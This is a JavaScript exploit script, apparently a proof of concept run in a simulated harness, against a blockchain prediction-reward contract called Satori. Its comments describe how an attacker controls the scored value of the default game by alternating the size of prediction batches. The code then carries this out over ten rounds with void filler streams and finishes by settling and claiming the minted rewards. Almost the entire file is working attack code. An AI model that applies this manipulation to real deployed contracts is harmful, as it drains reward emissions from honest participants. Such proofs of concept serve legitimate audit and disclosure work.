// ============================================================================
// REAL-THEFT FINDING: the DEFAULT game's scored value is attacker-CONTROLLED.
// ============================================================================
// The default game (gameId 1, "Satori Predictions", DEFAULT_STREAM_ID) is
// unconditionally gameLive (SatoriVoting.gameLive: `|| gameId == DEFAULT_STREAM_ID`)
// AND mint-eligible (it carries vote weight). Unlike ALPHA/BETA, whose value is a
// RANDOM price walk nobody can foresee, the default stream's value is written by
// SatoriEngine.flushDefaultStream as `_roundState[today-1].predictionCount` — the
// network's own per-round on-chain prediction COUNT.
//
// That count is set by the predictors themselves. A user may call
// predictMultipleWithPayloads only ONCE per round (predictedStreamsCount guard),
// so the SIZE of that single batch is a direct lever on the count. By alternating
// my batch size HIGH/LOW each round I drive the count up and down ON DEMAND, and
// the default game therefore scores each of my predictions against a value I
// chose. sign(post-anchor) reduces to sign(count(T+1)-count(T)) — both counts are
// mine — so I predict the KNOWN direction and win ~100% on a MINT-PAYING game,
// harvesting its slice of every round's emission budget with ZERO forecasting
// risk. Impossible on the random ALPHA/BETA streams; trivial here.
//
// The volume padding lands on my own UNAPPROVED filler streams held at a CONSTANT
// value, so those settle VOID (PredictionVoided, never scored) and never touch the
// win-rate — they exist only to move the global count.
module.exports = async ({ world, tools, ethers, log }) => {
  const { fix } = world;
  const { games, satori } = fix;
  const attacker = world.attacker;
  const DEFAULT_GAME = 1;
  const HOUR = 3600;

  const N_FILLER = 15;   // HIGH-round batch = 1 + 15 filler predictions vs LOW-round batch = 1
  const ROUNDS = 10;     // game-1 predictions (>=8 get scored; last is settled at the end)

  const asSatori = satori.connect(attacker);
  const nowHour = async () => Math.floor((await ethers.provider.getBlock("latest")).timestamp / HOUR);

  // align to a round boundary so each prediction lands early in its round
  const offset = (await nowHour()) % 24;
  if (offset !== 0) await tools.advance_time.run({ hours: 24 - offset });

  // create filler streams/games (unapproved) and seed a CONSTANT value -> they settle VOID
  const fillers = [];
  for (let i = 0; i < N_FILLER; i++) {
    const { streamId } = await tools.create_stream.run({ name: "F" + i, cadenceMinutes: 60 });
    const gid = Number(await games.binaryGameByStream(streamId));
    await tools.set_value.run({ streamId, value: 100 });
    fillers.push({ streamId, gid });
  }
  log(`created ${fillers.length} filler games; start round=${(await satori.getCurrentRound()).toString()}`);

  for (let r = 0; r < ROUNDS; r++) {
    await tools.advance_time.run({ hours: 24 });          // fresh round: honest ticks + flush(prev count)
    const anchor = Number((await tools.stream_info.run({ streamId: DEFAULT_GAME })).value);
    const high = (r % 2 === 0);
    // Effective scoring window is (anchor=count(this round), post=count(next round)).
    // HIGH round -> next round is LOW -> post<anchor -> predict DOWN(2).
    // LOW  round -> next round is HIGH-> post>anchor -> predict UP(1).
    const dir = high ? 2 : 1;

    const reqs = [{ gameId: DEFAULT_GAME, payload: dir === 1 ? "0x01" : "0x02" }];
    if (high) {
      for (const f of fillers) { try { await tools.set_value.run({ streamId: f.streamId, value: 100 }); } catch (e) {} }
      for (const f of fillers) reqs.push({ gameId: f.gid, payload: "0x01" });
    }
    try { await (await asSatori.predictMultipleWithPayloads(reqs)).wait(); }
    catch (e) { log(`r${r} batch ERR ${e.message}`); }
    log(`r${r} round=${(await satori.getCurrentRound()).toString()} anchor=${anchor} high=${high} dir=${dir} batch=${reqs.length}`);
  }

  // one more (LOW) round so the final prediction's post lands, then settle + claim
  await tools.advance_time.run({ hours: 24 });
  try { await tools.settle.run({ gameId: DEFAULT_GAME }); } catch (e) { log("final settle ERR " + e.message); }
  try { await tools.claim.run({}); } catch (e) {}

  const eng = world.engine;
  const scored = await eng.queryFilter(eng.filters.PredictionScored(attacker.address), 0);
  let n = 0, c = 0;
  for (const e of scored) if (Number(e.args.gameId) === DEFAULT_GAME) { n++; if (e.args.correct) c++; }
  log(`game-1 scored=${n} correct=${c}`);
  log(await tools.state.run({}));
};
